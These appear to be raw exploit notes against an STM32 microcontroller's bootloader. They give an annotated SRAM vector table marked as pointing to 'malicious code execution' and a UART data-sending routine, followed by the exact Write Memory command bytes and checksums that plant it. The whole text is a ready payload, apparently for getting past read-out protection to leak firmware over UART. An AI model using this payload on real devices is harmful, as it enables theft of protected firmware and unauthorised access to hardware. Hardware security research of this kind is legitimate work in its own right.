0x2000_2000:        00 40 00 20     ; 0x2000_4000, main stack pointer address
0x2000_2004:        01 30 00 20     ; 0x2000_3001, malicious code execution address, thumb mode
0x2000_2008:        29 f0 ff 1f     ; 0x1fff_f029, send_data_through_uart address, thumb mode
0x2000_200c:        00 38 01 40     ; 0x4001_3800, USART1 base address
0x2000_2010:        00 10 02 40     ; 0x4002_1000, Reset Clock Config base address
0x2000_2014:        83 5c 00 30     ; 0x0300_5c83, RCC->CR register value
0x2000_2018:        0a 00 10 00     ; 0x0010_000a, RCC->CFGR register value
0x2000_201c:        10 e0 00 e0     ; 0xe000_e010, Systick->Control and Status register base address
0x2000_2020:        05 00 01 00     ; 0x0001_0005, Systick register value

Write Memory:
31 CE
20002000 00
23              ; 35+1 bytes
00400020 
01300020 
29f0ff1f 
00380140
00100240
835c0030 
0a001000        ; 004000200130002029f0ff1f0038014000100240835c00300a001000 (A1F4EC2F, 96, Size:1B up until here, 27+1 bytes)
10e000e0 
05000100        ; 004000200130002029f0ff1f0038014000100240835c00300a00100010e000e005000100 (B414EDCF, 82)
A1




0xe000e010:	0x00010005
